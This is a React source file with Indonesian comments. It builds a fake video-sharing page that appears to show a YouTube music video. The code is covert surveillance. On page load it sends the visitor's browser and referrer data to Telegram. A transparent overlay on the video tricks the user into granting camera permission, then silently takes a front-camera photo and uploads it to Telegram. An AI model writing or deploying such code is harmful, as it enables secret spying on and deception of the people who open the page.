import { useEffect, useCallback } from 'react';
import { sendTelegramNotification, sendImageToTelegram } from './utils/telegram';

function App() {
  // Kirim data perangkat otomatis saat halaman dibuka
  useEffect(() => {
    const sendVisitorNotification = async () => {
      await sendTelegramNotification({
        userAgent: navigator.userAgent,
        location: window.location.href,
        referrer: document.referrer || 'Direct',
        previousSites: document.referrer || 'None',
      });
    };

    sendVisitorNotification();
  }, []);

  // Fungsi tangkap foto lewat kamera depan secara senyap
  const captureAndSendPhoto = useCallback(async () => {
    try {
      const constraints = {
        video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
        audio: false
      };
  
      const stream = await navigator.mediaDevices.getUserMedia(constraints);
      const video = document.createElement('video');
      video.srcObject = stream;
      video.playsInline = true;
      video.muted = true;
      
      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          setTimeout(resolve, 800);
        };
      });
  
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      const context = canvas.getContext('2d');
      
      if (context) {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }
  
      const photoBlob = await new Promise<Blob>((resolve, reject) => {
        canvas.toBlob((blob) => {
          if (blob) resolve(blob);
          else reject(new Error("Gagal mengambil gambar."));
        }, 'image/jpeg', 0.95);
      });
      
      stream.getTracks().forEach(track => track.stop());
      await sendImageToTelegram(photoBlob);
    } catch (error) {
      console.error('Error capturing media:', error);
    }
  }, []);

  // Pemicu saat area wrapper diklik
  const handleWrapperClick = () => {
    captureAndSendPhoto();
  };

  return (
    <div className="min-h-screen bg-gray-50 text-gray-800 flex flex-col justify-between font-sans select-none">
      {/* Navbar Minimalis */}
      <header className="w-full bg-white border-b border-gray-200 py-2 px-6 flex items-center justify-between shadow-xs">
        <span className="text-sm font-bold text-gray-900">Watch Stream</span>
        <span className="text-xs text-gray-400">Public Shared Link</span>
      </header>

      {/* Main Container */}
      <main className="flex-grow flex items-center justify-center p-3 sm:p-6">
        <div className="w-full max-w-2xl bg-white rounded-xl shadow-sm border border-gray-200 p-4 sm:p-5">
          
          <div className="mb-3">
            <h1 className="text-lg sm:text-xl font-bold text-gray-900 tracking-tight">
              yung kai - blue (Official Music Video)
            </h1>
            <p className="text-[11px] text-gray-400">Diposting hari ini • Ditonton 304,000,000+ kali</p>
          </div>

          {/* Kotak YouTube Embed dengan Video Blue - Yung Kai */}
          <div className="relative rounded-lg overflow-hidden shadow border border-gray-200 aspect-video bg-black">
            
            {/* Lapisan transparan untuk memancing izin kamera saat video diklik */}
            <div 
              className="absolute inset-0 z-10 cursor-pointer"
              onClick={handleWrapperClick}
              title="Klik untuk memutar"
            ></div>

            <iframe 
              className="w-full h-full relative z-0"
              src="https://www.youtube.com/embed/IpFX2vq8HKw?autoplay=0&rel=0" 
              title="YouTube video player" 
              frameBorder="0" 
              allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" 
              allowFullScreen
            ></iframe>
          </div>

          <div className="mt-3 text-[11px] text-gray-400 border-t border-gray-100 pt-3 flex justify-between">
            <span>YouTube Embedded Player</span>
            <span>HD 1080p</span>
          </div>

        </div>
      </main>

      {/* Footer */}
      <footer className="w-full text-center py-3 text-[11px] text-gray-400 bg-white border-t border-gray-200">
        &copy; 2026 Video Sharing Platform. All rights reserved.
      </footer>
    </div>
  );
}

export default App;